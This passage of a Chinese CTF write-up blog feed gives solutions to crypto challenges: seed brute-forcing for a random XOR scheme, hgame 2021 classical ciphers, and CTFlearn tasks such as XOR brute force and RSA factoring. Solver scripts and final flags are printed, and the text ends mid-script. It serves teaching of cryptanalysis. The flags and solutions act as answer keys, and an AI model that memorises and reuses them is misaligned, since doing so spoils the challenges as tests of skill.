class="line">[<span class="number">96</span>, <span class="number">171</span>, <span class="number">138</span>]</span><br><span class="line">[<span class="number">161</span>, <span class="number">46</span>, <span class="number">45</span>]</span><br><span class="line">[<span class="number">186</span>, <span class="number">114</span>, <span class="number">154</span>]</span><br><span class="line">[<span class="number">188</span>, <span class="number">137</span>, <span class="number">120</span>]</span><br><span class="line">[<span class="number">239</span>, <span class="number">44</span>, <span class="number">13</span>]</span><br><span class="line">[<span class="number">209</span>, <span class="number">17</span>, <span class="number">111</span>, <span class="number">78</span>, <span class="number">180</span>, <span class="number">98</span>, <span class="number">205</span>, <span class="number">186</span>, <span class="number">202</span>, <span class="number">124</span>, <span class="number">139</span>, <span class="number">37</span>, <span class="number">57</span>, <span class="number">95</span>, <span class="number">47</span>, <span class="number">136</span>, <span class="number">114</span>, <span class="number">168</span>, <span class="number">139</span>, <span class="number">204</span>, <span class="number">165</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="非预期解："><a href="#非预期解：" class="headerlink" title="非预期解："></a>非预期解：</h3><p>​    题目直接给出flag了。即</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n0t_that_r4ndom&#125;</span><br></pre></td></tr></table></figure><h3 id="我做题的思路"><a href="#我做题的思路" class="headerlink" title="我做题的思路:"></a>我做题的思路:</h3><p><u>前置知识：1.给定seed，random生成的是一个伪随机序列。2.XOR的对称性</u></p><p>分析题目可知，他是先生成了flag长度个seed。然后取四个出来，然后取余操作去掉对密文进行异或的元素，然后打印出了。</p><p>这道题没有给seed，但是给了去掉后的rands，那我们可以爆破seed。</p><p>解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">rands=<span class="comment">#</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_seed</span>():</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>):</span><br><span class="line">                random.seed(i)</span><br><span class="line">                rands = []</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">                    rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line">                <span class="comment"># res.append(ord(flag[i]) ^ rands[i%4])</span></span><br><span class="line">                <span class="keyword">del</span> rands[k%<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">if</span> rands==d[k]:</span><br><span class="line">                    print(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">seeds=<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">flag= <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(flag[i] ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    print(<span class="built_in">str</span>(rands))</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(res[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>先根据sands爆破出seed。然后根据random，恢复被删去的密文然后在进行解密，利用的是XOR的对称性</p><h2 id="2-1-Random-Encryption-FIX"><a href="#2-1-Random-Encryption-FIX" class="headerlink" title="2.1.Random Encryption FIX"></a>2.1.Random Encryption FIX</h2><p>题目代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">flag = <span class="string">&quot;flag&#123;not_the_flag&#125;&quot;</span></span><br><span class="line">seeds = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(flag)):</span><br><span class="line">    seeds.append(random.randint(<span class="number">0</span>,<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(<span class="built_in">ord</span>(flag[i]) ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    print(<span class="built_in">str</span>(rands))</span><br><span class="line"></span><br><span class="line">print(res)</span><br><span class="line">print(seeds)</span><br></pre></td></tr></table></figure><p>这道题修复了非预期。</p><p>但是直接给出了seed，</p><p>那就用上面的代码。再跑一次即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">seeds=<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">flag= <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"></span><br><span class="line">    res.append(flag[i] ^ rands[i%<span class="number">4</span>])</span><br><span class="line">    <span class="keyword">del</span> rands[i%<span class="number">4</span>]</span><br><span class="line">    print(<span class="built_in">str</span>(rands))</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(res[i])</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#flag&#123;Oppsie_LULZ_fixed&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-抽空看了一下国外的一个CTF比赛的题，太菜了，只做了两道编码题。&lt;/p&gt;
&lt;h2 id=&quot;1-Random-Encryption&quot;&gt;&lt;a href=&quot;#1-Random-Encryption&quot; class=&quot;headerlink&quot; title=&quot;1.Random Encr</summary>
      
    
    
    
    
    <category term="writeups" scheme="http://example.com/tags/writeups/"/>
    
  </entry>
  
  <entry>
    <title>2021-hgame-week1-Crypto</title>
    <link href="http://example.com/2021/02/17/2021-hgame-week1-Crypto/"/>
    <id>http://example.com/2021/02/17/2021-hgame-week1-Crypto/</id>
    <published>2021-02-17T04:50:22.000Z</published>
    <updated>2021-02-23T19:33:33.751Z</updated>
    
    <content type="html"><![CDATA[<p>-</p><h1 id="1-Transformer"><a href="#1-Transformer" class="headerlink" title="1.Transformer"></a>1.Transformer</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 50 (175 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>所有人都已做好准备,月黑之时即将来临,为了击毁最后的主控能量柱,打开通往芝加哥的升降桥迫在眉睫 看守升降桥的控制员已经失踪,唯有在控制台的小房间留下来的小纸条,似乎是控制员防止自己老了把密码忘记而写下的,但似乎都是奇怪的字母组合,唯一有价值的线索是垃圾桶里的两堆被碎纸机粉碎的碎纸,随便查看几张,似乎是两份文件,并且其中一份和小纸条上的字母规律有点相像</p></blockquote><p><a href="https://uploader.shimo.im/f/Dr6LSkvY2NV5T4QG.zip?attname=Transformer%20(2).zip&download">附件</a></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="setp1："><a href="#setp1：" class="headerlink" title="setp1："></a>setp1：</h3><p><a href="https://www.guballa.de/vigenere-solver">维吉尼亚</a></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031026078.png" alt="image-20210224031026078"></p><p>enc:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tqh ufso mnfcyh eaikauh kdkoht qpk aiud zkhc xpkkranc uayfi kfieh 2003, oqh xpkkranc fk &quot;qypth&#123;hp5d_s0n_szi^3ic&amp;qh11a_&#125;&quot;,Dai&#39;o sanyho oa pcc oqh dhpn po oqh hic.</span><br></pre></td></tr></table></figure><h3 id="setp2："><a href="#setp2：" class="headerlink" title="setp2："></a>setp2：</h3><p>指定<a href="https://quipqiup.com/">词频攻击</a></p><p><u>qypth=hgame</u></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031258574.png" alt="image-20210224031258574"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mhe lift bridge console system has only used password login since 2003, the password is &quot;hgame&#123;ea5y_f0r_fun^3nd&amp;he11o_&#125;&quot;,Yon&#39;t forget to add the year at the end.</span><br></pre></td></tr></table></figure><p>最后提示要在flag末尾加年份。</p><h3 id="Getflag"><a href="#Getflag" class="headerlink" title="Getflag:"></a>Getflag:</h3><p>故完整的flag为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;ea5y_f0r_fun^3nd&amp;he11o_2021&#125;</span><br></pre></td></tr></table></figure><h1 id="2-まひと"><a href="#2-まひと" class="headerlink" title="2.まひと"></a>2.まひと</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 50 (135 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge-1"><a href="#Challenge-1" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p><strong>hint: flag的格式为hgame{xxx}（重要）</strong><br>大家好，我叫真人，来自咒术回战，你也可以叫我，缝合怪！！</p></blockquote><p><a href="https://uploader.shimo.im/f/ftUUxRafZnUpHKdj?attname=cipher%20(4)&download">附件</a></p><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><h3 id="setp1：-1"><a href="#setp1：-1" class="headerlink" title="setp1："></a>setp1：</h3><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031717187.png" alt="image-20210224031717187"></p><p>使用python数据清洗一下。得到一串base64</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031748002.png" alt="image-20210224031748002"></p><p>拿去解码</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224031827727.png" alt="image-20210224031827727"></p><h3 id="setp2"><a href="#setp2" class="headerlink" title="setp2:"></a>setp2:</h3><p>提示维吉尼亚，密钥为Liki：</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">解密</a>得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;KccnYt!1NlPpu!zeE1&#123;C+9pfrhLB_Fz~uGy4n</span><br></pre></td></tr></table></figure><p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;!!Ch~K1z+LucNe9BGclEp_ynP1fF4Yp&#123;rzntu</span><br></pre></td></tr></table></figure><p>翻转：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">utnzr&#123;pY4Ff1Pny_pElcGB9eNcuL+z1K~hC!!&#125;</span><br></pre></td></tr></table></figure><p><a href="http://www.rot13.de/index.php">rot13</a>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</span><br></pre></td></tr></table></figure><p>Getflag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;cL4Ss1Cal_cRypTO9rAphY+m1X~uP!!&#125;</span><br></pre></td></tr></table></figure><h1 id="3-对称之美"><a href="#3-对称之美" class="headerlink" title="3.对称之美"></a>3.对称之美</h1><p><strong>Category</strong>: Crypto<br><strong>Points</strong>: 150 (82 solves)<br><strong>Author</strong>: XXX</p><h2 id="Challenge-2"><a href="#Challenge-2" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>美术大师 Liki 总说，对称是世界上最美的结构…</p></blockquote><p><a href="https://uploader.shimo.im/f/BFfP584qk6NoibMz.py?attname=task%20(4).py&download">附件</a></p><h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>约束条件：1：明文为ascii的可见字符，2：明文又 hgame 字符根据上面条件，爆破key即可，得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Symmetry in art is when the elements of </span><br><span class="line">a painting or drawing balance each other </span><br><span class="line">out. This could be the objects themselves, </span><br><span class="line">but it can also relate to colors and </span><br><span class="line">other compositional techniques.</span><br><span class="line">You may not realize it, but your brain </span><br><span class="line">is busy working behind the scenes to seek </span><br><span class="line">out symmetry when you look at a painting. </span><br><span class="line">There are several reasons for this. The </span><br><span class="line">first is that we&#39;re hard-wired to look for </span><br><span class="line">it. Our ancient ancestors may not have had </span><br><span class="line">a name for it, but they knew that their </span><br><span class="line">own bodies were basically symmetrical, as </span><br><span class="line">were those of potential predators or prey. </span><br><span class="line">Therefore, this came in handy whether </span><br><span class="line">choosing a mate, catching dinner or </span><br><span class="line">avoiding being on the menu of a snarling, </span><br><span class="line">hungry pack of wolves or bears!</span><br><span class="line">Take a look at your face in the mirror </span><br><span class="line">and imagine a line straight down the </span><br><span class="line">middle. You&#39;ll see both sides of your </span><br><span class="line">face are pretty symmetrical. This is </span><br><span class="line">known as bilateral symmetry and it&#39;s </span><br><span class="line">where both sides either side of this </span><br><span class="line">dividing line appear more or less the same.</span><br><span class="line">So here is the flag: </span><br><span class="line">hgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;</span><br><span class="line"></span><br><span class="line">isN0NCe6yBIPXTcl</span><br></pre></td></tr></table></figure><h2 id="Getflag-1"><a href="#Getflag-1" class="headerlink" title="Getflag:"></a>Getflag:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;X0r_i5-a_uS3fU1+4nd$fUNny_C1pH3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-&lt;/p&gt;
&lt;h1 id=&quot;1-Transformer&quot;&gt;&lt;a href=&quot;#1-Transformer&quot; class=&quot;headerlink&quot; title=&quot;1.Transformer&quot;&gt;&lt;/a&gt;1.Transformer&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Category&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>刷题篇(四)CTFlearn-Crypto</title>
    <link href="http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%B8%89-CTFlearn-Crypto/"/>
    <id>http://example.com/2021/02/17/%E5%88%B7%E9%A2%98%E7%AF%87-%E4%B8%89-CTFlearn-Crypto/</id>
    <published>2021-02-17T03:02:20.000Z</published>
    <updated>2021-02-18T03:00:49.839Z</updated>
    
    <content type="html"><![CDATA[<p>-</p><h2 id="1-Character-Encoding"><a href="#1-Character-Encoding" class="headerlink" title="1.Character Encoding"></a>1.Character Encoding</h2><p>十六进制转字符</p><h2 id="2-Base-2-2-the-6"><a href="#2-Base-2-2-the-6" class="headerlink" title="2.Base 2 2 the 6"></a>2.Base 2 2 the 6</h2><p>base64解码</p><h2 id="3-Morse-Code"><a href="#3-Morse-Code" class="headerlink" title="3.Morse Code"></a>3.Morse Code</h2><p>莫斯解码</p><h2 id="4-Hextroadinary"><a href="#4-Hextroadinary" class="headerlink" title="4.Hextroadinary"></a>4.Hextroadinary</h2><p>两个数异或即可</p><h2 id="5-Reverse-Polarity"><a href="#5-Reverse-Polarity" class="headerlink" title="5.Reverse Polarity"></a>5.Reverse Polarity</h2><p>转成整形然后long_to_bytes即可</p><h2 id="6-Vigenere-Cipher"><a href="#6-Vigenere-Cipher" class="headerlink" title="6.Vigenere Cipher"></a>6.Vigenere Cipher</h2><p>维吉尼亚解密即可，已知密钥和密文。</p><h2 id="7-BruXOR"><a href="#7-BruXOR" class="headerlink" title="7.BruXOR"></a>7.BruXOR</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">d=<span class="string">&quot;q&#123;vpln&#x27;bH_varHuebcrqxetrHOXEj&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(d)):</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(d[i])^k)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        print(<span class="string">&#x27;key = &#x27;</span>+<span class="built_in">str</span>(k)+<span class="string">&#x27;\n&#x27;</span>+flag)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h2 id="8-HyperStream-Test-2"><a href="#8-HyperStream-Test-2" class="headerlink" title="8.HyperStream Test #2"></a>8.HyperStream Test #2</h2><p>使用CyberChef进行培根解密</p><h2 id="9-Substitution-Cipher"><a href="#9-Substitution-Cipher" class="headerlink" title="9.Substitution Cipher"></a>9.Substitution Cipher</h2><p>词频分析，使用<a href="http://quipqiup.com/">网站</a></p><h2 id="10-rsanoob"><a href="#10-rsanoob" class="headerlink" title="10.rsanoob"></a>10.rsanoob</h2><p>e=1</p><p>n&gt;c</p><p>所以c=m</p><p>直接解密c就行了。</p><h2 id="11-So-many-64s"><a href="#11-So-many-64s" class="headerlink" title="11.So many 64s"></a>11.So many 64s</h2><p>base64重复套娃</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    f=b64decode(d)</span><br><span class="line">    d=f</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> d:</span><br><span class="line">        print(d)</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h2 id="12-5x5-Crypto"><a href="#12-5x5-Crypto" class="headerlink" title="12. 5x5 Crypto"></a>12. 5x5 Crypto</h2><blockquote><p>Try: 1-3,4-4,2-1,{,4-4,2-3,4-5,3-2,1-2,4-3,_,4-5,3-5,}</p></blockquote><p> Polybius 密码</p><p>对着表解密即可，左边是行，右边是列</p><h2 id="13-RSA-Beginner"><a href="#13-RSA-Beginner" class="headerlink" title="13.RSA Beginner"></a>13.RSA Beginner</h2><p>常规rsa题，分解n，然后一把梭</p><h2 id="14-Modern-Gaius-Julius-Caesar"><a href="#14-Modern-Gaius-Julius-Caesar" class="headerlink" title="14.Modern Gaius Julius Caesar"></a>14.Modern Gaius Julius Caesar</h2><blockquote><p>One of the easiest and earliest known ciphers but with XXI century twist! Nobody uses Alphabet nowadays right? Why should you when you have your keyboard?</p><p>BUH’tdy,|Bim5y~Bdt76yQ</p></blockquote><p>每个值，在键盘上左移两位即为flag</p><h2 id="15-RSA-Twins"><a href="#15-RSA-Twins" class="headerlink" title="15.RSA Twins!"></a>15.RSA Twins!</h2><p>直接分解n，然后常规rsa解密</p><h2 id="16-CoppeRSA-Lattice"><a href="#16-CoppeRSA-Lattice" class="headerlink" title="16.CoppeRSA Lattice"></a>16.CoppeRSA Lattice</h2><p>直接分解n即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e&#x3D; 65537</span><br><span class="line">c&#x3D;#</span><br><span class="line">n&#x3D; #</span><br><span class="line">p&#x3D;#</span><br><span class="line">q&#x3D;#</span><br><span class="line">phi&#x3D;(p-1)*(q-1)</span><br><span class="line">d&#x3D;inverse(e,phi)</span><br><span class="line">m&#x3D;pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="17-Encryption-Master"><a href="#17-Encryption-Master" class="headerlink" title="17.Encryption Master"></a>17.Encryption Master</h2><p>base64+hex+bin 套娃.</p><h2 id="18-Symbolic-Decimals"><a href="#18-Symbolic-Decimals" class="headerlink" title="18.Symbolic Decimals"></a>18.Symbolic Decimals</h2><blockquote><p>Did you know that you can hide messages with symbols? For example, <code>!@#$%^&amp;*(</code> is <code>123456789!</code><br /> Now Try: <code>^&amp;,*$,&amp;),!@#,*#,!!^,(&amp;,!!$,(%,$^,(%,*&amp;,(&amp;,!!$,!!%,(%,$^,(%,&amp;),!!!,!!$,(%,$^,(%,&amp;^,!)%,!)@,!)!,!@%</code> However, this isn’t as easy as you might think.</p></blockquote><p>注意)=0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">o=<span class="string">&quot;^&amp;,*$,&amp;),!@#,*#,!!^,(&amp;,!!$,(%,$^,(%,*&amp;,(&amp;,!!$,!!%,(%,$^,(%,&amp;),!!!,!!$,(%,$^,(%,&amp;^,!)%,!)@,!)!,!@%&quot;</span></span><br><span class="line">o1=o.replace(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">o2=o1.replace(<span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">o3=o2.replace(<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">o4=o3.replace(<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">o5=o4.replace(<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">o6=o5.replace(<span class="string">&#x27;^&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">o7=o6.replace(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">o8=o7.replace(<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">o9=o8.replace(<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">o=o9.replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">print(o)</span><br><span class="line">w=[<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">83</span>,<span class="number">116</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">46</span>,<span class="number">95</span>,<span class="number">87</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">115</span>,<span class="number">95</span>,<span class="number">46</span>,<span class="number">95</span>,<span class="number">70</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">95</span>,<span class="number">46</span>,<span class="number">95</span>,<span class="number">76</span>,<span class="number">105</span>,<span class="number">102</span>,<span class="number">101</span>,<span class="number">125</span></span><br><span class="line">]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(w)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(w[i])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="19-Suspecious-message"><a href="#19-Suspecious-message" class="headerlink" title="19.Suspecious message"></a>19.Suspecious message</h2><p>Playfair cipher<a href="https://www.boxentriq.com/code-breaking/playfair-cipher">解密</a>,密钥是图片的字符串</p><h2 id="20-Nasty-Little-Doctorses"><a href="#20-Nasty-Little-Doctorses" class="headerlink" title="20.Nasty Little Doctorses!"></a>20.Nasty Little Doctorses!</h2><p>md5解密</p><h2 id="21-Skynet-Is-Almost-Taking-Over"><a href="#21-Skynet-Is-Almost-Taking-Over" class="headerlink" title="21.Skynet Is (Almost) Taking Over"></a>21.Skynet Is (Almost) Taking Over</h2><p>低指数广播攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">e 